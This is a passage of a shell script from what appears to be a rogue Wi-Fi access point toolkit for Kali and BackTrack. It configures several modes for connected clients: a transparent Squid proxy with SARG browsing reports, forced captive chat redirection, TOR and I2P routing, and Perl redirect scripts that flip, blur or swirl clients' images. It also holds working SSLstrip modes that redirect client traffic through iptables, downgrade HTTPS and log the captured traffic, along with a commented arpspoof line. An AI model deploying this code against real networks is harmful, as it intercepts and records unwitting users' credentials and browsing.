	if [ "$Squid_ver" = "3.3.8" ];then
		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%#http_port 3127%http_port 3127%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%log_fqdn off%#log_fqdn off%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
	elif [ "$Squid_ver" = "3.1.20" ];then
		#echo "Kali Squid3 version 3.1.20"
		sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
	fi
elif [ "$OS" = "BackTrack_5R3" ];then
	if [ "$Squid_ver" = "3.3.8" ];then
		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%#http_port 3127%http_port 3127%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
		sed 's%log_fqdn off%#log_fqdn off%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
	elif [ "$Squid_ver" = "3.1.20" ];then
		#echo "BT5 Squid3 version 3.1.20"
		sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
	fi
fi

if [ -n "`pidof squid3`" ];then
	squid3 -k reconfigure
	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 storeURL script: /etc/squid3/url_rewrite"
else
	/etc/init.d/squid3 restart
	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 storeURL script: /etc/squid3/url_rewrite"
fi

# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
if [  ! -d /var/www/sarg-realtime  ];then
	mkdir /var/www/sarg-realtime
	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
fi

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP
#Transparent Squid3
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:3128
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128

# Start apache2 so it can serve real time reports from SARG to our localhost.
/etc/init.d/apache2 start
$cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"

# Start Sarg. Create real time reports
sleep 3
$necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
sarg -r > /dev/null &
$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
$cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"

echo
echo "Your clients are now Transparently HTTP Proxied. In this mode we're trying to achieve high BYTES hit ratio with Squid3."
echo "There are a lot of fine tuned refresh rules for certain sites to keep those contents longer in the cache"
echo "or to extend the time before the content has to be revalidated."
echo "You must have in mind that there are some directives used that violate HTTP! Mainly because explicit reloads"
echo "form clients are ignored for some files and the requests are directly satisfied from the cache without revalidation!"
echo
$cecho "To see a more detailed but static (not real time) report about who-when is connected and what was visited,"
$cecho "top sites, sites & users please type in a console "$RED"'" sarg -x -z "'"$END"." 
$cecho "Then go to $HOME_DIR/squid-reports and open index.html."
$cecho "Only "$GREEN"http sites"$END" will get affected. The script has no affect to "$RED"https sites"$END"."
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 		Mode "Air chat" :Client's will be forced to chat with the AP, through any browser.		#
#														#
# http://www.wardriving-forum.de/wiki/Airchat-Tutorial								#
# https://www.wardriving-forum.de/forum/f324/airchat-~-wireless-fun-66648.html					#
#################################################################################################################
if [ "$WLNMODE" = "Air_chat" ];then

# See if Air-chat is installed, If not, install it.
if [ ! -d /var/www/ajaxscript ] || [ ! -d /var/www/aw_tpl ] || [ ! -d /var/www/black_tpl ] || [ ! -d /var/www/smilies ] || [ ! -f /var/www/admin.php ] || [ ! -f /var/www/anmeldung.php ] || [ ! -f /var/www/bad_words.txt ] || [ ! -f /var/www/chat.csv ] || [ ! -f /var/www/config.php ] || [ ! -f /var/www/filtering.inc.php ] || [ ! -f /var/www/gesperrt.csv ] || [ ! -f /var/www/incert.php ] || [ ! -f /var/www/index.php ] || [ ! -f /var/www/lesen.php ] || [ ! -f /var/www/online.csv ] || [ ! -f /var/www/online.php ] || [ ! -f /var/www/onlinereloader.php ] || [ ! -f /var/www/plugins.inc.php ] || [ ! -f /var/www/reloader.php ] || [ ! -f /var/www/schreiben.php ] || [ ! -f /var/www/tpl.inc.php ];then
	if [ -f $DEPEND_DIR/dependencies/airchat_2.1a/airchat.tar.bz2 ];then
		tar xjf $DEPEND_DIR/dependencies/airchat_2.1a/airchat.tar.bz2 -C /var/
		chmod 777 /var/www/*.csv
	fi
else
	# Clean up. New session
cat > /var/www/chat.csv << EOF
#
EOF
	cat /dev/null > /var/www/gesperrt.csv
	cat /dev/null > /var/www/online.csv
	chmod 777 /var/www/*.csv
fi

# Start apache2 so it can serve Air Chat to our clients.
/etc/init.d/apache2 start

$necho "[....] Starting Air chat.(/var/www/)"
$browser localhost > /dev/null &
$cecho "\r[ "$GREEN"ok"$END" ] Starting Air chat.(/var/www/)"

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP

# Traffic from clients (80 and 443) will end up to localhost port 80 where Air chat is running. No matter what URLs they enter
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:80
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 443 -j DNAT --to-destination 192.168.60.129:80

echo
$cecho "Your clients now "$RED"CANNOT"$END" access the Internet."
echo "Traffic from clients (80 and 443) (no matter what URLs they enter) will end up"
echo "to localhost port 80 where Air chat is running."
$cecho ""$RED"Wait until a client connects to Air chat"$END""
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 	Mode "Anonymous Surfing - Deep Web access (TOR)" :Clients will transparently and anonymously 		#
# 		surf to the web and Deep Web - They can access Deep Web's sites -  .onion sites			#
#################################################################################################################

if [ "$WLNMODE" = "TOR_tunnel" ];then

# Create a new torrc file. TOR will run at gateway port 9040 and DNS queries will passed through TOR network only running at port 53.
cat > /etc/tor/torrc << EOF
Log notice file /var/log/tor/notices.log 
VirtualAddrNetworkIPv4 10.192.0.0/10 
ControlPort 127.0.0.1:9051
#Password: Kali_linux
#16:6E4A9DCAF30CEDD7609A9969C858408FD824D0237F15BC7CE104A20659
AutomapHostsOnResolve 1 
TransPort 9040 
TransListenAddress $INETIP 
DNSPort 53
DNSListenAddress $INETIP
DisableDebuggerAttachment 0
EOF

# If for some reason DNSmasq is running, then stop it. We don't want to have DNS leaks.
if [ -n "`pidof dnsmasq`" ];then
	$necho "[....] Stopping DNSMASQ. DNS queries will passed through TOR only."
	kill "`pidof dnsmasq`" > /dev/null &
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping DNSMASQ. DNS queries will passed through TOR only."
fi

# Let's start TOR daemon.
/etc/init.d/tor start
$cecho "[ "$GREEN"ok"$END" ] TOR's conf file: /etc/tor/torrc"
#Let's start ARM
$necho "[....] Starting ARM. (The Anonymizing Relay Monitor)."
xterm -geometry 160x40-0+0 -e "arm"&
$cecho "\r[ "$GREEN"ok"$END" ] Starting ARM. (The Anonymizing Relay Monitor)."

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $INETIP:53
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp -m multiport --dports 80,443 -j DNAT --to-destination $INETIP:9040
#iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 443 -j DNAT --to-destination $INETIP:9040
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp -m multiport --dports 80,443 -j REDIRECT --to-ports 9040

echo
$cecho "Your clients that are connected to our SoftAP, can access transparently"
$cecho "and anonymously the web and the Deep Web also. ( .onion sites)"
$cecho "DNS queries will passed through TOR Network Only"
$cecho ""$GREEN"Please check anonymity by visiting:"$END""
$cecho ""$BLUE"https://check.torproject.org/"$END""
$cecho ""$BLUE"http://www.whatismyip.com/"$END""
$cecho ""$BLUE"https://www.dnsleaktest.com/"$END""
echo
echo "Some .onion sites:"
$cecho ""$GREEN"DuckDuckGo Search Engine"$END""
$cecho ""$BLUE"http://3g2upl4pq6kufc4m.onion/"$END""
$cecho ""$GREEN"TORCH – Tor Search Engine"$END""
$cecho ""$BLUE"http://xmh57jrzrnw6insl.onion/"$END""
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 		Mode "Anonymous Surfing - Deep Web access (I2P)" :Clients will surf		 		#
# 		to the web and if they set MANUALLY to use I2p proxy THEN AND ONLY THEN 			#
# 	they can surf the web through I2P network and they can access Deep Web's sites - .i2p sites		#
#################################################################################################################

if [ "$WLNMODE" = "I2P" ];then

# Create custom dnsmasq.conf.
cat > $HOME_DIR/dnsmasq.conf << EOF
# Configuration file for dnsmasq.
filterwin2k
interface=$ATFACE
no-dhcp-interface=$ATFACE
address=/.i2p/$INETIP#4444
EOF

# If for some reason DNSmasq is running, then stop it. 
if [ -n "`pidof dnsmasq`" ];then
	$necho "[....] Stopping dnsmasq."
	kill "`pidof dnsmasq`" > /dev/null &
	$cecho "\r[ "$GREEN"ok"$END" ] Stopping dnsmasq."
fi

sleep 3

# Solve our DNS Forwarder
$necho "[....] Starting DNSMASQ with a new configuration file $HOME_DIR/dnsmasq.conf"
/usr/sbin/dnsmasq --conf-file=$HOME_DIR/dnsmasq.conf > /dev/null &
$cecho "\r[ "$GREEN"ok"$END" ] Starting DNSMASQ with a new configuration file $HOME_DIR/dnsmasq.conf."


# Delete existing /root/.i2p folder
if [ -d /root/.i2p ];then
	rm -r /root/.i2p
fi

# Modifying i2ptunnel.config
if [ -n "`grep '127.0.0.1' $i2prouter_conf/i2ptunnel.config`" ];then
	$necho "[....] Modifying i2p's i2ptunnel file to be able to run on $INETIP."
	sed 's%127.0.0.1%'$INETIP'%g' $i2prouter_conf/i2ptunnel.config > $i2prouter_conf/i2ptunnel.config1 && mv $i2prouter_conf/i2ptunnel.config1 $i2prouter_conf/i2ptunnel.config
	sed 's%tunnel.1.startOnLoad=true%tunnel.1.startOnLoad=false%g' $i2prouter_conf/i2ptunnel.config > $i2prouter_conf/i2ptunnel.config1 && mv $i2prouter_conf/i2ptunnel.config1 $i2prouter_conf/i2ptunnel.config
	sed 's%tunnel.2.startOnLoad=true%tunnel.2.startOnLoad=false%g' $i2prouter_conf/i2ptunnel.config > $i2prouter_conf/i2ptunnel.config1 && mv $i2prouter_conf/i2ptunnel.config1 $i2prouter_conf/i2ptunnel.config
	sed 's%tunnel.3.startOnLoad=true%tunnel.3.startOnLoad=false%g' $i2prouter_conf/i2ptunnel.config > $i2prouter_conf/i2ptunnel.config1 && mv $i2prouter_conf/i2ptunnel.config1 $i2prouter_conf/i2ptunnel.config
	sed 's%tunnel.4.startOnLoad=true%tunnel.4.startOnLoad=false%g' $i2prouter_conf/i2ptunnel.config > $i2prouter_conf/i2ptunnel.config1 && mv $i2prouter_conf/i2ptunnel.config1 $i2prouter_conf/i2ptunnel.config	
	sed 's%tunnel.5.startOnLoad=true%tunnel.5.startOnLoad=false%g' $i2prouter_conf/i2ptunnel.config > $i2prouter_conf/i2ptunnel.config1 && mv $i2prouter_conf/i2ptunnel.config1 $i2prouter_conf/i2ptunnel.config	
	#sed 's%tunnel.6.interface=127.0.0.1%tunnel.6.interface='$INETIP'%g' $i2prouter_conf/i2ptunnel.config > $i2prouter_conf/i2ptunnel.config1 && mv $i2prouter_conf/i2ptunnel.config1 $i2prouter_conf/i2ptunnel.config
	$cecho "\r[ "$GREEN"ok"$END" ] Modifying i2p's i2ptunnel file to be able to run on $INETIP."
fi

#Let's start I2P router.
#$cecho ""$RED"Starting I2P proxy."$END""
$i2prouter_path/i2prouter start
$cecho "[ "$GREEN"ok"$END" ] I2P's conf file: $i2prouter_conf/i2ptunnel.config"

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP

echo
$cecho "To be able to surf through I2P network you must set your clients to use as:"
$cecho "HTTP proxy : "$GREEN""$INETIP" port 4444"$END" and as"
$cecho "HTTPS proxy: "$GREEN""$INETIP" port 4445"$END"."
$cecho "then your clients can access anonymously the web and the Deep Web also.( .i2p sites)"
$cecho "You may want also to increase the Bandwidth in I2P Router Console."
$cecho "Have in mind that most probably WE HAVE DNS leaks. So, you're not that anonymous as we want."
$cecho ""$GREEN"Please check anonymity by visiting:"$END""
$cecho ""$BLUE"http://www.whatismyip.com/"$END""
$cecho ""$BLUE"https://www.dnsleaktest.com/"$END""
$cecho ""$BLUE"https://check.torproject.org/"$END""
echo
echo "Some .i2p sites:"
$cecho ""$GREEN"Development Discussion"$END""
$cecho ""$BLUE"http://zzz.i2p/"$END""
$cecho ""$GREEN"I2P Collection"$END""
$cecho ""$BLUE"http://echelon.i2p/"$END""
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 			Mode: SSLstriped (Clients can access Internet - Transparently SSLstriped)		#
#################################################################################################################
if [ "$WLNMODE" = "SSLstriped" ];then

# Let's create our directory for SSLStrip (if it doesn't exist). $HOME_DIR/sslstrip/
# The content of the connections is written to the $HOME_DIR/sslstrip/output-ssl.log

if [ ! -d $HOME_DIR/sslstrip/ ];then
	mkdir $HOME_DIR/sslstrip/
fi
# Clean if exist sslstrip's output-ssl.log
if [ -f $HOME_DIR/sslstrip/output-ssl.log ];then
	cat /dev/null > $HOME_DIR/sslstrip/output-ssl.log
	chown root:root $HOME_DIR/sslstrip/output-ssl.log
fi

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# sslstrip: Log all SSL and HTTP traffic to and from server, substitute a lock favicon, kill sessions in progress.
$necho "[....] Starting SSLstrip."
xterm -geometry -0+0 -e "sslstrip -a -f -k -l 8080 --write $HOME_DIR/sslstrip/output-ssl.log"&
$cecho "\r[ "$GREEN"ok"$END" ] Starting SSLstrip."

# No needed:
#xterm -e "arpspoof -i $ATFACE 192.168.60.129"&

echo
$cecho "We are now sniffing:"
$cecho "non-SSL traffic: "$GREEN"HTTP"$END" and SSL-based traffic: "$GREEN"HTTPS"$END""
$cecho "Unfortunately in this days sslstrip is not the best program to do that."
$cecho "Maybe, you may want to try sslsplit or mitmproxy"
$cecho "You may want to check sslstrip's log file which is located at: $HOME_DIR/sslstrip/output-ssl.log"
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 	Mode: Proxied & SSLstriped ( Clients can access Internet - Transparently proxied and SSLstriped)	#
#################################################################################################################
if [ "$WLNMODE" = "Proxied-SSLstriped" ];then

# Let's create our directory for SSLStrip(if it doesn't exist). $HOME_DIR/sslstrip/
# The content of the connections is written to the $HOME_DIR/sslstrip/output-ssl.log

if [ ! -d $HOME_DIR/sslstrip/ ];then
	mkdir $HOME_DIR/sslstrip/
fi

# Clean if exist sslstrip's output-ssl.log
if [ -f $HOME_DIR/sslstrip/output-ssl.log ];then
	cat /dev/null > $HOME_DIR/sslstrip/output-ssl.log
	chown root:root $HOME_DIR/sslstrip/output-ssl.log
fi

# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
if [  ! -d /var/www/sarg-realtime  ];then
	mkdir /var/www/sarg-realtime
	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
fi

# Let's start Squid3
/etc/init.d/squid3 restart

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:8080
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp -m multiport --dports 80,443 -j REDIRECT --to-ports 3127

# Start apache2 so it can serve real time reports from SARG to our localhost.
/etc/init.d/apache2 start
$cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"

# sslstrip: Log all SSL traffic to and from server, substitute a lock favicon, kill sessions in progress.
$necho "[....] Starting SSLstrip and send traffic to Squid3."
xterm -geometry -0+0 -e "proxychains sslstrip -a -f -k -l 8080 --write $HOME_DIR/sslstrip/output-ssl.log"&
$cecho "\r[ "$GREEN"ok"$END" ] Starting SSLstrip and send traffic to Squid3."
$cecho "[ "$GREEN"ok"$END" ] Proxychains conf file: /etc/proxychains.conf"
# Start Sarg. Create real time reports
sleep 3
$necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
sarg -r > /dev/null &
$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
$cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"

echo
$cecho "We are now sniffing:"
$cecho "non-SSL traffic: "$GREEN"HTTP"$END" and SSL-based traffic: "$GREEN"HTTPS"$END""
$cecho "Unfortunately in this days sslstrip is not the best program to do that."
$cecho "Maybe, you may want to try sslsplit or mitmproxy"
$cecho "You may want to check sslstrip's log file which is located at: $HOME_DIR/sslstrip/output-ssl.log"
$cecho "To see a more detailed but static (not real time) report about who-when is connected and what was visited,"
$cecho "top sites, sites & users please type in a console "$RED"'" sarg -x -z "'"$END"." 
$cecho "Then go to $HOME_DIR/squid-reports and open index.html."
$cecho "In Transparent Proxied and SSLstriped WLAN mode you cannot see domain names in reports, only IPs."
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 					Mode "Flipped, Blurred, Swirled" 					#
# 		Client's browser images will be Transparently Upside Down or Blurred or Swirled			#
# 		https://code.google.com/p/g0tmi1k/source/browse/trunk#trunk%2FsquidScripts			#
# 					g0tmilk's redirect script						#
#################################################################################################################
if [ "$WLNMODE" = "Fliped_Blured_Swirled" ];then

# Create our redirect script
# You can set $debug = 1 to get debug output to /tmp/Images_debug.log
cat > /usr/local/bin/redirect.pl << "EOF"
#!/usr/bin/perl
########################################################################
# redirect.pl        --- Squid Script (Flips images vertical)  	       #
# g0tmi1k 2011-03-25   --- Original Idea: http://www.ex-parrot.com/pete#
########################################################################

use IO::Handle;
use LWP::Simple;
use POSIX strftime;

$debug = 0;                      	# Debug mode - create log file
$ourIP = "127.0.0.1"; 			# Our IP address
$baseDir = "/var/www/images";       	# Needs be writable by 'nobody'
$baseURL = "http://".$ourIP."/images";	# Location on websever
$mogrify = "/usr/bin/mogrify";     	# Path to mogrify

$|=1;
$flip = 0;
$count = 0;
$pid = $$;

if ($debug == 1) { open (DEBUG, '>>/tmp/Images_debug.log'); }
autoflush DEBUG 1;

print DEBUG "########################################################################\n";
print DEBUG strftime ("%d%b%Y-%H:%M:%S\t Server: $baseURL/\n",localtime(time()));
print DEBUG "########################################################################\n";
while (<>) {
   chomp $_;
   if ($_ =~ /(.*\.(gif|png|bmp|tiff|ico|jpg|jpeg))/i) {                         # Image format(s)
      $url = $1;                                                                 # Get URL
      if ($debug == 1) { print DEBUG "Input: $url\n"; }                          # Let the user know

      $ext = ($url =~ m/([^.]+)$/)[0];                                           # Get the file extension
      $file = "$baseDir/$pid-$count.$ext";                                       # Set filename + path (Local)
      $filename = "$pid-$count.$ext";                                            # Set filename        (Remote)

      getstore($url,$file);                                                      # Save image
      system("chmod", "a+r", "$file");                                           # Allow access to the file
      if ($debug == 1) { print DEBUG "Fetched image: $file\n"; }                 # Let the user know

      $flip = 1;                                                                 # We need to do something with the image
   }
   else {                                                                        # Everything not a image
      print "$_\n";                                                              # Just let it go
      if ($debug == 1) { print DEBUG "Pass: $_\n"; }                             # Let the user know
   }

   if ($flip == 1) {                                                             # Do we need to do something?
      system("$mogrify", "-flip", "$file");
      system("chmod", "a+r", "$file");
      if ($debug == 1) { print DEBUG "Flipped: $file\n"; }

      print "$baseURL/$filename\n";
      if ($debug == 1) { print DEBUG "Output: $baseURL/$filename, From: $url\n"; }
   }
   $flip = 0;
   $count++;
}

close (DEBUG);
EOF

# If $F_B_S_command=flip leave the script as is. If $F_B_S_command=(blur or swirl), then correct the mogrify and debug lines in the above redirect.pl script.
if [ "$F_B_S_command" = "blured" ];then
	sed 's%system("$mogrify", "-flip", "$file");%system("$mogrify", "-blur", "3", "$file");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect.pl1 && mv /usr/local/bin/redirect.pl1 /usr/local/bin/redirect.pl
	sed 's%if ($debug == 1) { print DEBUG "Flipped: $file\n"; }%if ($debug == 1) { print DEBUG "Blurred: $file\n"; }%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect.pl1 && mv /usr/local/bin/redirect.pl1 /usr/local/bin/redirect.pl
elif [ "$F_B_S_command" = "swirl" ];then
	sed 's%system("$mogrify", "-flip", "$file");%system("$mogrify", "-swirl", "180", "$file");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect.pl1 && mv /usr/local/bin/redirect.pl1 /usr/local/bin/redirect.pl
	sed 's%if ($debug == 1) { print DEBUG "Flipped: $file\n"; }%if ($debug == 1) { print DEBUG "Swirled: $file\n"; }%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect.pl1 && mv /usr/local/bin/redirect.pl1 /usr/local/bin/redirect.pl
fi



# Make it executable
chmod 755 /usr/local/bin/redirect.pl

# Make dir /images/ in /var/www/ and if exist erase it's contents
if [ ! -d /var/www/images ];then
	mkdir /var/www/images
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
	#chown nobody /var/www/images
else
	rm -r -f /var/www/images/*
fi

# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
if [  ! -d /var/www/sarg-realtime  ];then
	mkdir /var/www/sarg-realtime
	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
fi

# Activate our redirect script in squid3.conf
# url_rewrite_program /usr/local/bin/redirect.pl
# redirect_children 
# Remove "#"
sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf

# Start apache2 so it can serve real time reports from SARG to our localhost.
/etc/init.d/apache2 start
$cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"

if [ -n "`pidof squid3`" ];then
	squid3 -k reconfigure
	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
else
	/etc/init.d/squid3 restart
	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
fi

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP
#Transparent Squid3
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:3128
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128

# Start Sarg. Create real time reports
sleep 3
$necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
sarg -r > /dev/null &
$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
$cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"

echo
if [ "$F_B_S_command" = "blured" ];then
	$cecho "Your clients are now Transparently HTTP Proxied "$RED"BUT"$END" their browser's images will be Blurred."

elif [ "$F_B_S_command" = "swirl" ];then
	$cecho "Your clients are now Transparently HTTP Proxied "$RED"BUT"$END" their browser's images will be Swirled."
else
	$cecho "Your clients are now Transparently HTTP Proxied "$RED"BUT"$END" their browser's images will be Upside Down."
fi
$cecho ""$RED"To take affect, don't forget to clean up your clients browser's cache."$END""
$cecho "To see a more detailed but static (not real time) report about who-when is connected and what was visited,"
$cecho "top sites, sites & users please type in a console "$RED"'" sarg -x -z "'"$END"." 
$cecho "Then go to $HOME_DIR/squid-reports and open index.html."
$cecho "Only "$GREEN"http sites"$END" will get affected. The script has no affect to "$RED"https sites"$END"."
$cecho ""$BLUE"https://code.google.com/p/g0tmi1k/source/browse/trunk#trunk%2FsquidScripts"$END""
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 		Mode "ASCII" :Client's browser images will be Transparently converted into ASCII art		#
#		https://code.google.com/p/g0tmi1k/source/browse/trunk/squidScripts/asciiImages.pl		#
#					g0tmilk's redirect script						#
#################################################################################################################
if [ "$WLNMODE" = "ASCII" ];then

# Create our redirect script
# You can set $debug = 1 to get debug output to asciiImages_debug.log

cat > /usr/local/bin/redirect.pl << "EOF"
#!/usr/bin/perl
########################################################################
# redirect.pl         --- Squid Script (Converts images into ascii art)#
# g0tmi1k 2011-03-25  --- Original Idea: http://prank-o-matic.com      #
########################################################################

use IO::Handle;
use LWP::Simple;
use POSIX strftime;

$debug = 0;                             # Debug mode - create log file
$ourIP = "127.0.0.1";                   # Our IP address
